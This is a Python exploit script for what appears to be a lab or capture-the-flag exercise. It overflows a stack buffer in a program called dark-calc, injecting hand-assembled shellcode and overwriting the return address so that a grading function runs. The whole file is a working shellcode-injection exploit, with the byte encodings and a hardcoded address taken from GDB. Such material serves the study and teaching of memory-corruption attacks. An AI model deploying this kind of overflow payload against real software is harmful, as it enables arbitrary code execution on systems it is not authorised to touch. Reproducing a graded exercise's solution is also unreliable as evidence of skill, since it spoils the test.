#!/usr/bin/env python3
"""Task 2: Shellcode on stack via buffer overflow. NX disabled.

dark-calc has a fixed RWX stack at 0x721000000000 via init_fixed_stack.
The expression buffer is at a fixed address on this stack.

Shellcode: push 4; pop rdi; mov rax, grade_eval; call rax
"""
import sys
import struct

# Shellcode: push 4; pop rdi; mov rax, grade_eval; call rax; nop
shellcode = (
    b"\x6a\x04"              # push 4          (2 bytes)
    + b"\x5f"                # pop rdi          (1 byte)  -> edi = 4
    + b"\x48\xc7\xc0\x87\x1a\x40\x00"  # mov rax, 0x401a87 (7 bytes)
    + b"\xff\xd0"            # call rax         (2 bytes)
    + b"\x90" * 4            # nop padding      (4 bytes)
)
assert len(shellcode) == 16

# Expression address from GDB: rbp-0x10 on fixed stack
expr_addr = 0x721000800fd0

payload = shellcode + b"B" * 8 + struct.pack("<Q", expr_addr)
sys.stdout.buffer.write(payload)